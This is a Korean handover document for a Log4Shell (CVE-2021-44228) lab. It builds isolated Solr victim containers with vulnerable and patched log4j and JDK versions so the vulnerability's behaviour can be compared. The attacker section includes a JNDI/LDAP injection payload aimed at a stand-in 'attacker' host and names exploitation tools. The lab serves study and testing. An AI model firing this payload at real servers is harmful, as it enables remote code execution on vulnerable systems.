# Log4Shell 비교 실습 랩 — 담당 A 인계 문서

> CVE-2021-44228 (Log4Shell) 4개 조건 비교 실습의 **피해자(victim) 환경**.
> 담당 A가 구성·검증 완료. 담당 B(공격자)·C(검증)가 이 문서만으로 환경을 받아 붙일 수 있도록 작성됨.
> 최종 검증일: 2026-11-24 · 네트워크: 완전 격리(internal) 적용

## 1. 개요
Log4j 2 취약점(CVE-2021-44228)이 log4j 버전과 JDK 버전에 따라 어떻게 다르게 동작하는지를 같은 페이로드로 비교하는 실습. 피해자는 Log4j 2.14.1을 번들한 Apache Solr 8.11.0 기반이며, 조건별로 JDK/log4j 버전만 달리한 3종의 컨테이너로 구성된다. 모든 컨테이너는 외부와 차단된 격리 네트워크(labnet, internal) 위에서 동작한다.

## 2. 조건 / 피해자 매핑
| 서비스 | 조건 | log4j | JDK | 기대 동작 |
|---|---|---|---|---|
| victim-v1 | ① 2.14.1 + 구JDK | 2.14.1 | 8u102 | JNDI 질의 + 원격 클래스 로딩(RCE) |
| victim-v2 | ② 2.14.1 + 신JDK | 2.14.1 | 8u212 | JNDI 질의 O, 원격 로딩 X |
| victim-v2 | ③ 로컬 가젯 체인 | 2.14.1 | 8u212 | 가젯 체인 페이로드 시 로컬 RCE 가능성 |
| victim-v3 | ④ 패치(대조군) | 2.17.1 | 11 | JNDI 질의 자체 차단 |

- ②와 ③은 같은 victim-v2를 쓰고 페이로드만 다르다.
- ①↔②는 log4j·Solr가 동일하고 JDK 패치레벨만 다르다(8u102 vs 8u212). 8u191을 경계로 trustURLCodebase 기본값이 true→false로 바뀌는 것이 차이의 원인.

## 3. 네트워크 격리 (중요)
labnet은 internal: true로 컨테이너의 외부 인터넷 접근이 차단된다. Docker Desktop에서는 이 설정이 호스트 published 포트 접근(localhost:8983 등)까지 막으므로, 호스트 브라우저로 Solr에 직접 접속할 수 없다. 모든 조작은 랩 내부에서 한다.
- 외부 egress: 차단 (검증: 컨테이너 안 curl 1.1.1.1 → 연결 실패)
- 내부 통신: 정상 (검증: victim-v1에서 curl http://victim-v3:8983/solr/ → 200 OK)
- 트리거/관찰: docker exec 또는 labnet에 붙은 컨테이너에서 수행
- 호스트 UI가 꼭 필요하면 labnet에서 internal: true 제거(일반 bridge) → published 포트 활성(단 외부 egress 열림, 공격자가 로컬이라 실험엔 무방)

## 4. 실행 방법
```
docker compose build victim-v2
docker compose up -d victim-v1 victim-v2 victim-v3
docker compose ps
docker compose down
```
네트워크 설정을 바꾼 뒤에는 반드시 down 후 다시 up 해야 네트워크가 깨끗하게 재생성된다(안 그러면 내부 DNS가 꼬인다).

## 5. 환경 검증
```
docker compose exec victim-v1 java -version      # 1.8.0_102
docker compose exec victim-v2 java -version      # 1.8.0_212
docker compose exec victim-v3 java -version      # 11.0.x
docker compose exec victim-v3 sh -c "find / -name 'log4j-core-*.jar' 2>/dev/null"
#   v1/v2 -> 2.14.1 , v3 -> 2.17.1
docker compose exec victim-v1 curl -m3 http://victim-v3:8983/solr/   # 200 OK (내부)
docker compose exec victim-v1 curl -m3 https://1.1.1.1               # 실패 (외부 차단)
```

## 6. 구성 내역 (A가 만든 방법)
- victim-v1: vulhub/solr:8.11.0 스톡. 기본 JDK가 8u102(<8u191)라 원격 클래스 로딩 가능 → 조건 ①.
- victim-v2: 스톡 이미지에 8u212 JRE를 멀티스테이지로 복사·교체. JDK만 8u191↑로 올려 조건 ②.
- victim-v3: 공식 solr:8.11.2(log4j 2.17.1 번들) → 대조군 ④.

## 7. 공격자 연결 규약 (담당 B)
- 네트워크: labnet — 공격자 컨테이너를 attacker 이름으로 추가
- 공격자 호스트명: attacker — 피해자가 ldap://attacker:1389/... 로 호출
- 피해자 주소(내부): http://victim-v1:8983 / victim-v2:8983 / victim-v3:8983 (localhost 아님)
- 트리거: GET /solr/admin/cores 의 action 파라미터
  예(labnet 내부): curl "http://victim-v1:8983/solr/admin/cores?action=\${jndi:ldap://attacker:1389/...}"
- 권장 도구: Java-Chains (표준 JNDI + 로컬 가젯 체인 모두 생성). JNDIExploit/marshalsec도 대안.

## 8. 검증/지표 규약 (담당 C)
1. JNDI/LDAP 질의 발생 — 공격자 LDAP 로그 또는 tcpdump
2. 원격 클래스 로딩 여부 — 실행 증거 /tmp/success 생성: docker compose exec <svc> ls /tmp/success
3. 로컬 가젯 동작 — 동일 마커로 판정 (조건 ③)
4. 패치 전후 차이 — 조건 ④에서는 JNDI 질의 자체가 발생하지 않음
- 모든 관찰은 docker exec/로그로 (격리로 호스트 UI 없음)
- 성공 판정 기준(/tmp/success)은 A·B·C 공통

## 9. 수령 절차 (B·C)
```
git clone <repo-url>
cd log4shell-lab
docker compose up -d victim-v1 victim-v2 victim-v3
docker compose exec victim-v1 curl -m3 http://victim-v3:8983/solr/   # 200 OK면 정상
```
vulhub 클론은 불필요(이미지는 Docker Hub에서 받음).
